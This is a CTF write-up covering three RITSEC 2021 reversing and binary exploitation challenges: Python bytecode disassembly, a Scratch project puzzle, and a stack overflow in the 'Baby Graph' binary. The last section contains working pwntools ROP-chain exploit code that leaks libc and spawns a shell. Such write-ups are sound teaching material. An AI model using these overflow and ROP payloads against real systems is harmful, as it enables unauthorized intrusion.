# RITSEC 2021 Reversing / Binary Exploitation Challenge Write-ups
The following write-up includes three challenges from RIT's RITSEC CTF 2021 competition.  All three challenges were in the `REV/BIN` category and featured some clever reverse engineering or binary exploitation.

## Table of Contents
* snek - 100 pts
* Fleshwound - 200 pts
* Baby Graph - 231 pts

## Snek - 100 pts
#### Framing the Challenge
Kicking off the `REV/BIN` category is a challenge called "snek".  All we are given is a `snek` file and the hint `no step on snek` from the author, `~knif3`.  For those unfamiliar, the hint refers to a popular meme with a play on the [Gadsden Flag](https://knowyourmeme.com/memes/gadsden-flag-dont-tread-on-me). 

![no-step-on-snek](https://i.kym-cdn.com/photos/images/original/001/116/586/96f.jpg).  

This might not be much of a hint for some players, so the logical next step is to try and identify the file.  Running `file` simply returns `data` which indicates that this is not a standard ELF or PE executable.  `strings` reveals some useful information, including `__init__` and `__name__`, which are indicative of a Python file.  Suddenly the hint makes sense!  However this is not a Python `.py` source code file, but rather compiled Python bytecode.  


The next hurdle occurs when trying to execute the program.  Depending on the version of Python a contestant has installed the bytecode may or may not execute.  By chance, an attempt running the file with Python v3.7 executed it without an error.   However a Docker container running Python 3.7 was created as a more flexible solution for those running Python >v3.7.  The next step was to determine an appropriate disassembler which would be added to the Dockerfile's installation dependencies.  A suitable candidate, [xdis](https://pypi.org/project/xdis/), was found.  This utility also requires Python's `click`, and both dependencies were installed in the Python 3.7 Docker image using the Dockerfile shown below: 

~~~Dockerfile
FROM python:3.7

run pip install xdis	
run pip install click 
 
user 1000:1000
~~~

The bytecode can now be executed within the container, revealing the prompt `Enter my name: `. Entering a random guess indicates an unsuccessful answer and terminates execution.  

~~~shell
❯ python3 snek
Enter my name: comed-ian
WRONG
~~~

Clearly some reverse engineering is required to identify the correct input and retrieve the flag.

#### Reverse Engineering the Bytecode
As mentioned previously, the `xdis` utility can assist by disassembling the compiled Python bytecode.  `xdis` can be run using a Python script, but also has a convenient CLI extension: `pydisasm`.  The file must be changed to use a `.pyc` extension before the disassembler can process it.  `pydisasm snek.pyc` yields a significant amount of metadata which indicates the source is Python 3.7 bytecode, as we established earlier.  Furthermore, the utility disassembles each method.  There are multiple methods recognized, however the key to this challenge exists in the `<module>` and `__init__` methods, which are described below 

##### <module>
The `<module>` method takes care of user interaction and initializing the environment.  It first creates a class `d` with methods `__init__` and `__eq__`.  For the sake of brevity, `__eq__` overloads the `==` operator and checks the equivalence of two parameters, `password` and `self.decrypt()`. The `__init__` method will be discussed in the next section.  `<module>` proceeds to print the problem prompt and accept user input, storing it in `x`.  Lines 28-34 define an object `a` of class `d`, instantiated with `x` as its input (e.g. `a = d(x)`).  Without any further reverse engineering, it is logical to assume that the `d` object performs an encryption / decryption algorithm, as the following line compares equivalence between `a` and `x`.  This is odd, however, as the resulting control flow either prints out `IS_THIS_THE_FLAG??` followed by `NOPE`, or `WRONG`.  It would therefore seem as if feeding the decrypted key into the program does not, in fact, yield the flag.  We next took a look into the `'d'` method, leading to an investigation of the `__init__` method.  

~~~asm 
  9:           4 LOAD_BUILD_CLASS
               6 LOAD_CONST           (<code object d at 0x7f35b8ca94b0, file "snek.py", line 9>)
               8 LOAD_CONST           ('d')
              10 MAKE_FUNCTION        (Neither defaults, keyword-only args, annotations, nor closures)
              12 LOAD_CONST           ('d')
              14 LOAD_NAME            (object)
              16 CALL_FUNCTION        (3 positional arguments)
              18 STORE_NAME           (d)

 20:          20 LOAD_NAME            (input)
              22 LOAD_CONST           ('Enter my name: ')
              24 CALL_FUNCTION        (1 positional argument)
              26 STORE_NAME           (x)

 21:          28 LOAD_NAME            (d)
              30 LOAD_NAME            (x)
              32 CALL_FUNCTION        (1 positional argument)
              34 STORE_NAME           (a)

 22:          36 LOAD_NAME            (a)
              38 LOAD_NAME            (x)
              40 COMPARE_OP           (==)
              42 POP_JUMP_IF_FALSE    (to 62)

 23:          44 LOAD_NAME            (print)
              46 LOAD_CONST           ('IS_THIS_THE_FLAG??')
              48 CALL_FUNCTION        (1 positional argument)
              50 POP_TOP

 24:          52 LOAD_NAME            (print)
              54 LOAD_CONST           ('NOPE')
              56 CALL_FUNCTION        (1 positional argument)
              58 POP_TOP
              60 JUMP_FORWARD         (to 70)

 26:     >>   62 LOAD_NAME            (print)
              64 LOAD_CONST           ('WRONG')
              66 CALL_FUNCTION        (1 positional argument)
              68 POP_TOP
         >>   70 LOAD_CONST           (None)
              72 RETURN_VALUE

~~~

##### __init__
As mentioned above, a class of type`d` is instantiated using the `__init__` method.  This method is relatively simple, and contains the info necessary for solving the challenge.  The method only takes two parameters, `self` and `password`.  The `password` input is first encoded into bytes, assuming a string input.  Next, a 77 byte list is created using a number of defined constants and stored in the member variable `self.decrypt`.  It is also noted that the `__eq__` method uses this `self.decrypt` variable for equivalence checking against an input string.  Furthermore, the loaded bytes appear to be ASCII letter values.  Therefore it is logical to assume that this string either is our key or contains our key.  

~~~asm 
# Varnames:
#	self, password
# Positional arguments:
#	self, password
 11:           0 LOAD_FAST            (password)
               2 LOAD_METHOD          (encode)
               4 CALL_METHOD          (0 positional arguments)
               6 LOAD_FAST            (self)
               8 STORE_ATTR           (password)

 12:          10 LOAD_CONST           (97)
              12 LOAD_CONST           (98)
              14 LOAD_CONST           (99)
              16 LOAD_CONST           (100)
              18 LOAD_CONST           (101)
              20 LOAD_CONST           (102)
              22 LOAD_CONST           (103)
              24 LOAD_CONST           (104)
              26 LOAD_CONST           (105)
              28 LOAD_CONST           (106)
              30 LOAD_CONST           (107)
              32 LOAD_CONST           (108)
              34 LOAD_CONST           (109)
              36 LOAD_CONST           (110)
              38 LOAD_CONST           (111)
              40 LOAD_CONST           (112)
              42 LOAD_CONST           (113)
              44 LOAD_CONST           (114)
              46 LOAD_CONST           (115)
              48 LOAD_CONST           (116)
              50 LOAD_CONST           (117)
              52 LOAD_CONST           (118)
              54 LOAD_CONST           (119)
              56 LOAD_CONST           (120)
              58 LOAD_CONST           (121)
              60 LOAD_CONST           (122)
              62 LOAD_CONST           (65)
              64 LOAD_CONST           (66)
              66 LOAD_CONST           (67)
              68 LOAD_CONST           (68)
              70 LOAD_CONST           (69)
              72 LOAD_CONST           (70)
              74 LOAD_CONST           (71)
              76 LOAD_CONST           (72)
              78 LOAD_CONST           (73)
              80 LOAD_CONST           (74)
              82 LOAD_CONST           (75)
              84 LOAD_CONST           (76)
              86 LOAD_CONST           (77)
              88 LOAD_CONST           (78)
              90 LOAD_CONST           (79)
              92 LOAD_CONST           (80)
              94 LOAD_CONST           (81)
              96 LOAD_CONST           (82)
              98 LOAD_CONST           (83)
             100 LOAD_CONST           (84)
             102 LOAD_CONST           (85)
             104 LOAD_CONST           (86)
             106 LOAD_CONST           (87)
             108 LOAD_CONST           (88)
             110 LOAD_CONST           (89)
             112 LOAD_CONST           (90)
             114 LOAD_CONST           (95)
             116 LOAD_CONST           (82)
             118 LOAD_CONST           (83)
             120 LOAD_CONST           (123)
             122 LOAD_CONST           (97)
             124 LOAD_CONST           (108)
             126 LOAD_CONST           (108)
             128 LOAD_CONST           (95)
             130 LOAD_CONST           (104)
             132 LOAD_CONST           (105)
             134 LOAD_CONST           (36)
             136 LOAD_CONST           (36)
             138 LOAD_CONST           (95)
             140 LOAD_CONST           (97)
             142 LOAD_CONST           (110)
             144 LOAD_CONST           (100)
             146 LOAD_CONST           (95)
             148 LOAD_CONST           (110)
             150 LOAD_CONST           (48)
             152 LOAD_CONST           (95)
             154 LOAD_CONST           (98)
             156 LOAD_CONST           (105)
             158 LOAD_CONST           (116)
             160 LOAD_CONST           (51)
             162 LOAD_CONST           (125)
             164 BUILD_LIST           77
             166 LOAD_FAST            (self)
             168 STORE_ATTR           (decrypt)
             170 LOAD_CONST           (None)
             172 RETURN_VALUE
~~~  

#### Printing the Key
A simple Python file was created to output the presumed ASCII values as characters.  

~~~python
#!/usr/bin/python3
key = [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 82, 83, 123, 97, 108, 108, 95, 104, 105, 36, 36, 95, 97, 110, 100, 95, 110, 48, 95, 98, 105, 116, 51, 125]

for k in key: 
    print(chr(k), end="")
~~~

The result was the string: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_RS{all_hi$$_and_n0_bit3}`, which clearly contains the RITSEC flag prefix at the end!  Now it makes sense why the program only printed out negative feedback, because the flag was present in ASCII form the entire time. 

## Fleshwound - 200 pts
#### Framing the Challenge
The next challenge in the `REV/BIN` category, Fleshwound, provided a single file `fleshwound.json` and the hint `Tis but a....`.  Monty Python fans will immediately recognize the truncated quote, though again the hint is not immediately apparent.  Investigation of the `fleshwound.json` file shows a lot of...garbage?  It is not clear how the JSON file should be interpreted.  A number of the fields are either obfuscated or otherwise poorly named and the plain text does not clearly indicate a path forward.  One interesting observation is that the file defines a number of "opcodes", with commands like `event_whenflagclicked`, `sensing_askandwait`, and `operator_equals`.  A quick search for these method names leads to [MIT's Scratch platform](https://scratch.mit.edu/) - an online application meant to introduce children to fundamental programming concepts.  This makes logical sense when considered in context with the challenge hint:

![tis_but_a_scratch](https://64.media.tumblr.com/tumblr_lwrv52wVCC1qmfycwo1_500.png)

The online platform accepts uploads, so long as they have a `.sb3` file extension, and modifying the file to `fleshwound.json.sb3` allows for successful import.

#### Reverse Engineering(?)

![scratch_1](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/RITSEC-2021/_images/scratch_1.png)

The next step, now that the Scratch file is uploaded, is half reverse engineering and half understanding how Scratch works. Simple testing showed that the green flag icon runs a prompt asking `What do you seek?`.  This seems to be on the right path, but a seemingly incorrect input does not yield positive or negative feedback.  Searching the JSON file for this string shows that it resides within a `sensing_askandwait` opcode.  It also shows that this "method" calls `iybEVB.t5+ShRV.(sy,r` as the next "block" which is a `control_if` opcode.  This makes logical sense, as the program should compare the user input with some key.  The operation uses condition `ds7|:EA%,[mCT/qcZQGw` in its comparison, which happens to be the next JSON field.  This `operator_equals` opcode uses defined operands, one of which is `gib flag`!  

~~~json
"Soe6]HpjC+UgMd:@;}m`": {
  "opcode": "sensing_askandwait",
  "next": "iybEVB.t5+ShRV.(sy,r",
  "parent": "cGx8SgL{LHM2sdl?BtcU",
  "inputs": {
    "QUESTION": [
      1,
      [
        10,
        "What do you seek?"
      ]
    ]
  },
  "fields": {},
  "shadow": false,
  "topLevel": false
},
"iybEVB.t5+ShRV.(sy,r": {
  "opcode": "control_if",
  "next": null,
  "parent": "Soe6]HpjC+UgMd:@;}m`",
  "inputs": {
    "CONDITION": [
      2,
      "ds7|:EA%,[mCT/qcZQGw"
    ],
    "SUBSTACK": [
      2,
      "pkoXojuxYKokNfFAPT;X"
    ]
  },
  "fields": {},
  "shadow": false,
  "topLevel": false
},
"ds7|:EA%,[mCT/qcZQGw": {
  "opcode": "operator_equals",
  "next": null,
  "parent": "iybEVB.t5+ShRV.(sy,r",
  "inputs": {
    "OPERAND1": [
      3,
      "ZrM|k+=dpJeT[{W_Yx.E",
      [
        10,
        ""
      ]
    ],
    "OPERAND2": [
      1,
      [
        10,
        "gib flag"
      ]
    ]
  },
  "fields": {},
  "shadow": false,
  "topLevel": false
},
~~~

The program was re-run using `gib flag` as the input, and the drum icon in the upper right (which is a "Sprite", one of Scratch's animated characters / objects) prints out `RS...{...Hmm is this is a distraction?!...Dancing...`.  Clearly this is on the right path, however some additional investigation must be performed.  Doing some brief recon, the Scratch platform appears to generate code using color-coded blocks and internal variables.  For example, it appears that an `__init__` function is declared which runs `fleshwound.json.py` from the uploaded JSON, which presumably runs the command prompt, but there is no instance where `__init__` is called.  After much poking around, a different Backdrop 1 "Stage" was discovered.  This is essentially another workspace for organizing the Scratch program and defines the behavior for clicking the green flag!

![backdrop_1](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/RITSEC-2021/_images/backdrop_1.png)

This Stage shows that the initial `RS{` are output using the Sprite's `think` command, however the `distract_me` function is called which prints the remaining text.  Clearly this call should be modified to something that prints out the remainder of the flag.  Again, much poking around ensued, until discovery of yet another Stage represented by the drum Sprite.  This contains commands a `finish` function which end with a `}`, which logically represents the rest of the flag.  Navigating back to Backdrop 1 and changing the `broadcast` block from `distract_me and wait` to `finish and wait`, the flag `RS{eeee_whats_th@t_scratch?}` is printed out sequentially in the drum's thought bubbles!

![scratch_2](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/RITSEC-2021/_images/scratch_2.png)

## Baby Graph - 231 pts
Finally, a more traditional binary exploitation challenge!  The Baby Graph challenge exposes a challenge domain and port, a libc file, a binary file, *and* its source code.  Running `file` on the binary shows that it is an ELF 64-bit executable.  Good news.  Diving into the source code, a glaring function is `void vuln()`, which provides call to `system`.  Furthermore, RIP control is not required to call `vuln()`, as it is called in `main()` prior to exit.  

~~~c
void vuln() {
    char buf[100];

    printf("Here is your prize: %p\n", system);
    fgets(buf, 400, stdin);
}
~~~

The rest of main establishes a graph with a randomized number of vertices and edges and prompts the user to determine if the graph is Eulerian ('Y' or 'N').  The user input is compared against a global `bruh` variable which is set in `generateGraph()` based on the whether any of the vertices has an even degree.

~~~c
int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    srand(time(NULL));
    char ans;

    for (int i = 0; i < NQUIZ; i++) {
        generateGraph();
        printGraph();

        puts("Now tell me if this baby is Eulerian? (Y/N)");
        scanf("%c%*c", &ans);

        if (ans != 'Y' && ans != 'N') {
            puts("Hey! Don't do that here");
            exit(-1);
        } else {
            bool b_ans = ans == 'Y';
            if (bruh != b_ans) {
                puts("Sorry you are wrong mate.");
                exit(-1);
            }
        }
    }

    vuln();
    return 0;
}
~~~

It does not seem initially feasible to compute the 'Y' or 'N' answer simply using the total number of edges and vertices, which are printed out to the console with each prompt.  However, this loop only executes `NQUIZ = 5` times.  Thus, brute forcing the answer will work one of every `2^5 = 32` times.  Furthermore, some fuzzing was performed to understand whether there is an implicit bias toward 'Y' or 'N'.  Results of thousands of iterations show that the correct answer is 'N'  approximately 3x as often as 'Y'.  This can be rationalized by understanding that `bruh` is set to false if *any* of the vertices has an even degree.  Since each graph is generated randomly with 2-10 vertices and (V(V-1))/2 edges, there is logically a much better chance that the `bruh` variable is false.  

After a few lucky guesses (`N-N-N-Y-N` seemed to be a lucky winning combination), `vuln()` was called.  Here the binary prints the address of `system()` and prompts for user input, retrieving it with `fgets()`.  While `fgets()` is a safer function than its vulnerable cousin `gets()`, the program has a clear overflow vulnerability by reading in 400 bytes into a 100 byte buffer.  Disassembly shows that the buffer is actually set to `0x70 = 112` bytes, but still clearly vulnerable to overflow.  This allows for RIP control and a ROP chain that uses gadgets in both the binary and libc, since the address to `system` can be used to calculate libc's base address during execution.  A snippet from `babygraph_solver.py` is included below showing the calculation.  

~~~python
# receive the system pointer from binary output
p.recvuntil("prize: ")
system_addr = p.recvline().strip()
system_addr = int(system_addr, 16)
# calculate libc base using pwntools
libc = ELF('./libc.so.6')
system_offset = libc.symbols['system']
libc_base = system_addr - system_offset
~~~ 

The rationale for finding libc's base address is to locate the address of `/bin/sh` to get a shell, as `/bin/sh` does not exist in the binary itself.  The buffer can be overflowed precisely, or the chain can use a `ret` address to create a "ret sled" that will slide into the first ROP gadget.  Since there are plenty of `pop rdi` gadgets in libc that can pop `/bin/sh` into the register, the ROP chain should be as simple as: 

~~~python
r = ROP(libc)
# /bin/sh string
bin_sh_offset = next(libc.search(b'/bin/sh\x00'))
bin_sh_addr = bin_sh_offset + libc_base
# pop rdi gadget
pop_rdi_offset = r.find_gadget(['pop rdi', 'ret']).address
pop_rdi_addr = pop_rdi_offset + libc_base
# ret gadget
ret_offset = r.find_gadget(['ret']).address
ret_addr = ret_offset + libc_base
chain = [
    pop_rdi_addr,
    bin_sh_addr,    # rdi
    system_addr,    # system call
]
p.sendline(p64(ret_addr) * (250 // 8) +  b''.join(p64(r) for r in chain))
~~~

Only, it's not?  The exploit, which works locally, continued to fail on the server.  Extensive debugging ensued which included a successful call to `puts` with `/bin/sh` popped into `rdi`.  Therefore the only conclusion which can be reached is that there was an error (intentional or otherwise) in the call to `system` in the server binary.  

An alternative means of popping a shell was created; this time using `execve` in lieu of `system`.  With libc available, finding `pop rsi` and `pop rdx` gadgets was not difficult, though the provided libc's simplest `pop rdx` gadget also included a pop to `r12`.  Furthermore, some implementations require that `rsi` and `rdx` point to `NULL` as opposed to storing `NULL` directly in the register.  Taking this into account, the following rop chain was developed:

~~~python
# pop rsi gadget
pop_rsi_offset = r.find_gadget(['pop rsi', 'ret']).address
pop_rsi_addr = pop_rsi_offset + libc_base

# pop rdx gadget
pop_rdx_offset = r.find_gadget(['pop rdx', 'pop r12', 'ret']).address
pop_rdx_addr = pop_rdx_offset + libc_base

# execve gadget
execve_offset = libc.symbols['execve']
execve_addr = execve_offset + libc_base

# null ptr (*VALID* pointer to 0)
nullptr_offset = next(libc.search(p64(0)))
nullptr_addr = nullptr_offset + libc_base

chain = [
    pop_rdi_addr,
    bin_sh_addr,    # rdi
    pop_rsi_addr,
    nullptr_addr,   # rsi
    pop_rdx_addr,
    nullptr_addr,   # rdx
    0,              # r12
    execve_addr,
]
p.sendline(p64(ret_addr) * (250 // 8) +  b''.join(p64(r) for r in chain))
~~~

A shell was successfully obtained with the new approach, and the flag `RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}` was captured!
